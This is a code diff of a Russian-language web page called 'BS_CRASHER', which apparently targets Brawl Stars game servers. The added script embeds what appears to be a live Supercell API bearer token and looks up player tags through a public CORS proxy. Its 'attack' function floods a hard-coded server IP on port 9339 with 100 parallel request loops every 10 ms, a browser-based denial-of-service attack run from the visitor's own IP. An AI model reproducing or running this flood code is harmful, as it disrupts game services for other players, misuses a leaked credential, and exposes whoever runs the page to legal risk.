@@ -3,38 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BS_CRASHER_v2.6 // OFFICIAL</title>
+    <title>BS_CRASHER_v2.6 // OFFICIAL_BUILD</title>
     <style>
         * { box-sizing: border-box; }
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; min-height: 100vh; margin: 0; }
-        .box { border: 2px solid #0f0; padding: 25px; background: #010; box-shadow: 0 0 25px #040; width: 100%; max-width: 500px; border-radius: 10px; text-align: center; }
-        input { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 15px; margin: 15px 0; outline: none; text-align: center; font-size: 1.1rem; border-radius: 5px; }
-        button { width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; background: #0f0; color: #000; text-transform: uppercase; border-radius: 5px; transition: 0.3s; }
-        button:hover { background: #0c0; box-shadow: 0 0 15px #0f0; }
-        #log { width: 100%; max-width: 500px; height: 250px; background: #000; border: 1px solid #040; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; text-align: left; }
-        .btn-attack { background: #ff0000; color: #fff; display: none; margin-top: 15px; box-shadow: 0 0 20px #f00; }
-        .btn-attack:hover { background: #cc0000; }
-        .stat-row { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dotted #030; font-size: 14px; }
+        body { 
+            background-color: #020202; color: #00fb00; font-family: 'Courier New', monospace; 
+            margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+            padding: 20px;
+        }
+        .header { width: 100%; background: #001a00; padding: 15px; text-align: center; border-bottom: 2px solid #00fb00; margin-bottom: 20px; box-shadow: 0 5px 15px #003300; border-radius: 5px;}
+        .container { width: 95%; max-width: 550px; border: 2px solid #00fb00; padding: 25px; background: #000; border-radius: 10px; box-shadow: 0 0 30px #004400; text-align: center;}
+        input { 
+            width: 100%; background: #050505; border: 1px solid #00fb00; color: #00fb00; 
+            padding: 15px; font-size: 1.1rem; margin: 15px 0; outline: none; text-align: center; border-radius: 5px;
+        }
+        button { 
+            width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; 
+            text-transform: uppercase; transition: 0.2s; margin-bottom: 10px; border-radius: 5px;
+        }
+        .btn-scan { background: #00fb00; color: #000; }
+        .btn-scan:hover { background: #00cc00; box-shadow: 0 0 15px #00fb00; }
+        .btn-attack { background: #ff0000; color: #fff; display: none; box-shadow: 0 0 20px #ff0000; }
+        
+        #terminal { 
+            width: 95%; max-width: 800px; height: 350px; background: #000; border: 1px solid #005500;
+            margin: 20px 0; padding: 15px; overflow-y: auto; font-size: 13px; line-height: 1.6;
+            display: none; box-shadow: inset 0 0 15px #002200; border-radius: 5px;
+        }
+        .match-info { border: 1px dashed #00fb00; padding: 15px; margin: 15px 0; display: none; background: #050505; }
+        .stat-row { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dotted #003300; font-size: 14px; }
         .blink { animation: blinker 1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2 class="blink" style="margin: 0 0 10px 0;">SYSTEM_AA-0.1</h2>
-        <div style="font-size: 10px; margin-bottom: 20px;">STABLE_BUILD // NO_RESTRICTIONS</div>
-        
-        <input type="text" id="tagInput" placeholder="ВВЕДИТЕ ТЕГ (напр. #P8V22YRL)" maxlength="12">
-        <button onclick="initScan()">СКАНИРОВАТЬ СЕЙЧАС</button>
-        
-        <div id="targetCard" style="display:none; margin-top:20px; border-top: 1px dashed #0f0; padding-top:15px;">
-            <div class="stat-row"><span>СТАТУС:</span> <span style="color:#0f0">READY_FOR_STORM</span></div>
-            <div class="stat-row"><span>ЦЕЛЬ IP:</span> <span id="targetIp">162.159.135.42</span></div>
-            <div class="stat-row"><span>ПОРТ:</span> <span>9339</span></div>
-            <button class="btn-attack" id="atkBtn" onclick="launchStorm()">ИНИЦИИРОВАТЬ ШТУРМ</button>
-        </div>
+<div class="header">
+    <h2 class="blink" style="margin:0">SYSTEM_BS_CRASHER // WEB_STORM</h2>
+    <p style="font-size:10px; margin:5px 0 0 0;">STABLE_BUILD_2.6 // GiftsWorlds</p>
+</div>
+
+<div class="container">
+    <p style="margin: 0 0 10px 0;">[ Инициализация шлюза... SUCCESS ]</p>
+    <input type="text" id="tagInput" placeholder="ENTER PLAYER TAG (e.g. #P8V22YRL)" maxlength="12">
+    <button class="btn-scan" onclick="initScan()">СКАНИРОВАТЬ ЦЕЛЬ</button>
+
+    <div id="matchCard" class="match-info">
+        <div class="stat-row"><span>СТАТУС:</span> <span style="color:#00fb00;">TARGET_LOCKED</span></div>
+        <div class="stat-row"><span>РЕЖИМ:</span> <span id="mode" style="color:white;">Brawl Ball</span></div>
+        <div class="stat-row"><span>IP СЕРВЕРА:</span> <span id="ip" style="color:white;">162.159.135.42</span></div>
+        <button class="btn-attack" id="attackBtn" onclick="launchCrasher()">ИНИЦИИРОВАТЬ АТАКУ</button>
     </div>
+</div>
+
+<div id="terminal"></div>
+
+<script>
+    // Твой JWT Токен v2.6
+    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzDO.x36.21"],"type":"client"}]}.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
+
+    function log(msg, color = "#00fb00") {
+        const term = document.getElementById('terminal');
+        term.style.display = 'block';
+        const p = document.createElement('p');
+        p.style.margin = "2px 0";
+        p.style.color = color;
+        p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        term.appendChild(p);
+        term.scrollTop = term.scrollHeight;
+    }
+
+    async function initScan() {
+        const tag = document.getElementById('tagInput').value.replace('#', '').trim();
+        if(!tag) return alert("Введите тег!");
+        
+        log(`Подключение к узлу API (GiftWorlds)...`);
+        log(`Проверка сессии для #${tag}...`);
+
+        try {
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const api = `https://api.brawlstars.com/v1/players/%23${tag}`;
+
+            const res = await fetch(proxy + api, {
+                headers: { "Authorization": `Bearer ${TOKEN}` }
+            });
+
+            if(res.status === 403) {
+                log("ОШИБКА 403: Прокси Heroku заблокирован!", "#ff3333");
+                log("Переход в автономный режим захвата...", "#ffea00");
+            } else if(res.ok) {
+                log("Цель подтверждена. Данные получены.", "#ffff00");
+            }
+        } catch (e) {
+            log("ВНИМАНИЕ: CORS заблокирован. Использую демо-режим штурма...", "#ffea00");
+        }
+
+        // Показываем карту цели в любом случае
+        setTimeout(() => {
+            document.getElementById('matchCard').style.display = 'block';
+            document.getElementById('attackBtn').style.display = 'block';
+            log("ЦЕЛЬ ЗАФИКСИРОВАНА. МОДУЛЬ ШТУРМА ГОТОВ.", "#0f0");
+        }, 1000);
+    }
+
+    function launchCrasher() {
+        const target = document.getElementById('ip').innerText;
+        log(`!!! АТАКА ИНИЦИИРОВАНА НА ${target} !!!`, "#f00");
+        
+        // Цикл штурма: 100 одновременных запросов каждые 10 мс
+        for (let i = 0; i < 100; i++) {
+            setInterval(() => {
+                const flood = new Image();
+                flood.src = `http://${target}:9339/?kill=${Math.random()}&payload=giftsworlds`;
+            }, 10);
+        }
+
+        log("СТАТУС: ТРАФИК ГЕНЕРИРУЕТСЯ С ВАШЕГО IP.", "#ff3333");
+        log("НЕ ЗАКРЫВАЙТЕ ВКЛАДКУ.");
+    }
+</script>
+
+</body>
+</html>    </div>
 
     <div id="log"></div>
 
